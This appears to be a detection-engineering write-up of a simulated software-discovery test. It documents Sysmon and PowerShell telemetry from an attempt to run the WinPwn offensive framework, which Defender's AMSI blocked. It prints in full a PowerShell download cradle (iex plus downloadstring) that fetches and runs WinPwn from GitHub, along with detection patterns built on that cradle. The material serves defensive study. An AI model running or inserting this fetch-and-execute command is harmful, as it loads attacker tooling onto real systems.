# T1518-4: Software Discovery — WinPwn - Dotnetsearch

## Technique Context

T1518 (Software Discovery) includes automated adversary tooling that performs software inventory as part of a broader post-compromise assessment. WinPwn is a PowerShell-based offensive framework by S3cur3Th1sSh1t that includes numerous discovery and privilege escalation functions. The `Dotnetsearch` function enumerates installed .NET Framework versions and related components, which is relevant to adversaries choosing compatible payloads or identifying lateral movement opportunities targeting .NET-based applications. The use of an `IEX` (Invoke-Expression) download cradle to fetch WinPwn from GitHub is the primary behavioral indicator, making this dataset representative of the "live off the internet" pattern where adversaries avoid dropping files by executing frameworks directly from remote URLs.

## What This Dataset Contains

The test invokes WinPwn via a download cradle and calls the `Dotnetsearch` function:

**Sysmon (Event ID 1, `technique_id=T1059.001`)** — The executing `powershell.exe` process is captured with the full command line:
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput}
```
The specific commit hash in the URL pins the WinPwn version, useful for threat intelligence correlation.

**Sysmon (Event ID 22, DNS)** — `raw.githubusercontent.com` DNS resolution by `powershell.exe`, returning four GitHub CDN IPs (`185.199.108-111.133`). This is a precise network indicator.

**Sysmon (Event ID 3, NetworkConnect)** — Three TCP connections from `MsMpEng.exe` (Windows Defender) to `172.178.160.22:443`. Defender is connecting out to its cloud protection service, triggered by the malicious script download. The PowerShell process's own outbound connection to `185.199.109.133:443` (GitHub CDN) is not separately logged under Event 3 because the Sysmon rule that fired here tagged Defender's connections (masquerading check), not the PowerShell connection. The DNS query (Event 22) + script block (4104) provides the PowerShell network evidence.

**PowerShell (Event ID 4104)** — The download cradle is captured in two script blocks:
- `& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...')\nDotnetsearch -noninteractive -consoleoutput}`
- The inner block without `& {}` wrapper.

**PowerShell (Event ID 4103)** — Module logging captures `New-Object` with TypeName `net.webclient`, confirming the download cradle was executed.

**PowerShell (Event ID 4100, Error)** — Windows Defender (via AMSI) blocked execution of the WinPwn script after it was downloaded. The error message reads: "This script contains malicious content and has been blocked by your antivirus software. Fully Qualified Error ID = ScriptContainedMaliciousContent, Microsoft.PowerShell.Commands.InvokeExpressionCommand". The `Dotnetsearch` function was never executed.

## What This Dataset Does Not Contain

- No output from `Dotnetsearch` — Defender blocked the payload before any .NET enumeration occurred.
- No registry reads of .NET Framework installation keys — the enumeration never ran.
- The WinPwn script content itself is not captured in a 4104 event because AMSI blocked execution before the script block was fully logged.
- No lateral movement or follow-on activity — the test ends at the AMSI block.

## Assessment

This dataset captures a complete Defender-blocked execution scenario. The telemetry is valuable precisely because it shows what defenders actually see when AMSI fires: the download cradle invocation is fully visible in Sysmon and PowerShell logs, the DNS query to GitHub is logged, and the AMSI block produces a PowerShell 4100 error with a clear error ID. The technique's intended behavior (software discovery) is absent, but the delivery mechanism telemetry is complete and high quality. For detection engineering focused on the WinPwn framework or `IEX + net.webclient.downloadstring` patterns against GitHub, this is a well-evidenced dataset.

## Detection Opportunities Present in This Data

1. **PowerShell 4104** — `iex(new-object net.webclient).downloadstring(` combined with `raw.githubusercontent.com` and a specific WinPwn function name is a high-confidence indicator.
2. **PowerShell 4100 with `ScriptContainedMaliciousContent`** — Any 4100 error with this Fully Qualified Error ID indicates AMSI fired on a downloaded or composed script; it should always be investigated regardless of the blocked content.
3. **Sysmon Event 22 (DNS)** — `powershell.exe` querying `raw.githubusercontent.com` is anomalous in most enterprise environments; it is a reliable indicator of a download cradle execution.
4. **PowerShell 4103** — `New-Object net.webclient` is the classic download cradle object instantiation; correlating this with the 4104 script block containing `downloadstring` is a two-event detection.
5. **Sysmon Event 1** — PowerShell command line containing `iex` + `downloadstring` + a GitHub raw content URL is a high-fidelity atomic indicator that can be directly signatured.
6. **Defender telemetry (Sysmon Event 3 from MsMpEng)** — Outbound connections from `MsMpEng.exe` to cloud protection immediately following a malicious script attempt correlate with the AMSI block and can serve as a secondary confirmation signal.
